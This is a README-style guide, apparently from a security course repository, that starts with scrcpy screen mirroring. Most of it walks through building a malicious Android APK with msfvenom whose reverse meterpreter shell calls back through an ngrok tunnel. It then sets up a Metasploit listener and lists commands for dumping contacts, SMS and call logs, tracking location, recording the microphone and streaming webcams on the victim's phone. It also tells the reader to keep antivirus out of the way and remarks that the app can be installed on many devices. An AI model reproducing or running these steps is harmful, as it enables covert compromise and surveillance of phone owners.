# LINUX GUIDE
# Hacking-and-Patching
The 3rd course of the fundamentals of computer and network security specializations. Hacking and patching, it is a short course title, but it says it all. This repository explains how to hack devices with command injection vulnerability.

# 1. SCRCPY MODULE
Using the scrcpy module is quite easy but still brainstorming on it additional functions
  # STEPS:
  1. Install scrcpy: use the command 'apt-get install scrcpy'
  2. Enable developer mode on the android to be coonected to the PC
  3. Enable USB Debugging 
  4. Connect the USB cord to the PC
  5. In your linux VM enable connection to the VM
  6. Type 'scrcpy' after successful connection to the VM and you should see your phone screen displayed on your VM

# 2. METASPLOIT FRAMEWORK
Knowledge is power, especially when it’s shared. A collaboration between the open source community and Rapid7, Metasploit helps security teams do more than just verify vulnerabilities, manage security assessments, and improve security awareness; it empowers and arms defenders to always stay one step (or two) ahead of the game.
  # ANDROID HACKING: using NGROK
  First make sure your antivirus does not interfere with your machine 
  1. download from link: https://ngrok.com/
  2. download the file and extract using 'sudo tar xvzf ngrok-stable-linux-amd64.tgz' in the directory where it was downloaded
  3. first sign-up to get an auth-token
  4. Then in your VM command line input: './ngrok authtoken <authtoken>'
  5. msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=4.tcp.ngrok.io LPORT=4444 R > /home/kali/Hacking/android-exploitation/virus.apk 
  
  Here:
  -p indicates a payload type
  android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
  LHOST is your local IP
  LPORT is your IP’s listening port
  /home/kali/Hacking/android-exploitation would give the output directly
  apk is the final malicious app
  If you navigate to the output path /home/kali/Hacking/android-exploitation, we’ll find the injected apk file
  
  6. We need to set a listener on our PC/server. If the target device installs and opens the “virus.apk” application, it’ll start sending a reverse connection to our listener.
  To create a listener using Metasploit, run these commands:
  7. Run 'msfconsole'
  8. use exploit/multi/handler
  9. set payload android/meterpreter/reverse_tcp
  10. set LHOST 4.tcp.ngrok.io
  11. set LPORT 5544
  12. exploit 
  
  install the 'apk' on the targetted device and open the app. If the user opens the app, it’ll send a connection to our listener and create a session. We can install the virus     app on many devices.
  To sell all sessions, run "background" command from the listener console. It’ll show all available connected devices sessions
  Available Commands
We can then enter help to see all the Android meterpreter commands.

I’m sharing some commands. Have a look:

  
      Command                  Description
  1. app_list	              Show all installed applications
  2. app_install	          Request to install apk file
  3. app_run	              Start an application
  4. app_uninstall	        Request to uninstall application
  5. dump_contacts	        Get all contacts and save in our PC
  6. dump_calllog	          Get call log and save in our PC
  7. dump_sms	              Get all sms and save in our PC
  8. send_sms	              Send sms to any number
  9. geolocacte	            Current lat and long of the device
  10. record_mic	          Sound recorder
  11. webcam_list	          Available cameras
  12. webcam_snap 1/2/3	    Take photo by selecting camera
  13. webcam_stream 1/2/3	  Open specific camera and live streaming

  
  
# Detecting Command Injection
The pdf "Commix: Detecting and exploiting command injection flaws.", is by Anastasios Stasinopoulos, Christoforos Ntantogian, Christos Xenakis from Department of Digital Systems, University of Piraeus.

